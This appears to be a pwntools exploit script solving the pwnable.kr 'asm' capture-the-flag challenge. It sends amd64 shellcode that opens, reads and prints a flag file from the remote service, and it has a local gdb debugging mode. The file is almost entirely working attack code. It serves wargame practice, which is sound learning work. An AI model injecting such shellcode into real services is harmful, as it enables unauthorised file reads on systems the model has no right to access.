from pwn import *
import argh


ADDR = 'pwnable.kr'
PORT = 9026

context.arch = 'amd64'

shellcode = """
    /* open(file='./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', oflag=0, mode=0) */
    /* push './this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00' */
    push 0x67
    mov rax, 0x6e6f306f306f306f
    push rax
    mov rax, 0x306f306f306f3030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x30306f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f30303030303030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x30306f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6c5f
    push rax
    mov rax, 0x797265765f73695f
    push rax
    mov rax, 0x656d616e5f656c69
    push rax
    mov rax, 0x665f6568745f7972
    push rax
    mov rax, 0x726f732e656c6966
    push rax
    mov rax, 0x5f736968745f6461
    push rax
    mov rax, 0x65725f657361656c
    push rax
    mov rax, 0x705f656c69665f67
    push rax
    mov rax, 0x616c665f726b2e65
    push rax
    mov rax, 0x6c62616e77705f73
    push rax
    mov rax, 0x695f736968742f2e
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall

    /* call read(3, 1094798848, 0x1d) */
    push rax
    pop rdi
    xor eax, eax /* SYS_read */
    push 0x1d
    pop rdx
    mov esi, 0x1010101 /* 1094798848 == 0x41414e00 */
    xor esi, 0x40404f01
    syscall

    /* write(fd=1, buf=1094798848, n=0x1d) */
    push 1
    pop rdi
    push 0x1d
    pop rdx
    mov esi, 0x1010101 /* 1094798848 == 0x41414e00 */
    xor esi, 0x40404f01
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
"""

def start_gdb(p):
    gdb.attach(p, '''
    layout regs
    b *main+282
    b *0x41414000
    continue
    ''')


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './asm'
    e = ELF(bin_path)

    if local:
        p = process(bin_path)
        start_gdb(p)
    elif runpwn:
        p = remote(ADDR, PORT)

    print(p.recvuntil('shellcode:'))

    p.sendline(asm(shellcode))  # the length was found via trial-and-error

    p.recvn(1)  # for some reason a 0x20 is sent first
    print(p.recvn(0x1d))


if __name__ == '__main__':
    argh.dispatch_command(main)

